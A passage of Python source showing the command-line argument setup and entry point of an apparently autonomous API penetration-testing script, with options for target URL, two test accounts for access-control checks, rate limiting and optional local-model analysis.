    parser = argparse.ArgumentParser(
        description="Vikramaditya Autopilot API Hunt — 12-Phase Autonomous VAPT",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 autopilot_api_hunt.py --base-url https://api.example.com --auth-creds user:pass
  python3 autopilot_api_hunt.py --base-url URL --auth-creds admin:pass --auth-creds-b learner:pass
  python3 autopilot_api_hunt.py --base-url URL --auth-creds user:pass --with-brain
        """)
    parser.add_argument("--base-url", required=True, help="API base URL")
    parser.add_argument("--auth-creds", required=True, help="user:pass for primary account")
    parser.add_argument("--auth-creds-b", help="user:pass for second account (IDOR/priv esc)")
    parser.add_argument("--login-url", default="login-view/", help="Login endpoint path")
    parser.add_argument("--frontend-url", help="Frontend URL for JS bundle scraping")
    parser.add_argument("--output", help="Output directory for findings")
    parser.add_argument("--rate-limit", type=float, default=5.0, help="Max requests/sec")
    parser.add_argument("--with-brain", action="store_true", help="Use local Ollama for analysis")
    args = parser.parse_args()

    run_autopilot(
        base_url=args.base_url,
        auth_creds=args.auth_creds,
        auth_creds_b=args.auth_creds_b,
        login_url=args.login_url,
        frontend_url=args.frontend_url,
        output_dir=args.output,
        rate_limit=args.rate_limit,
        with_brain=args.with_brain,
    )


if __name__ == "__main__":
    main()
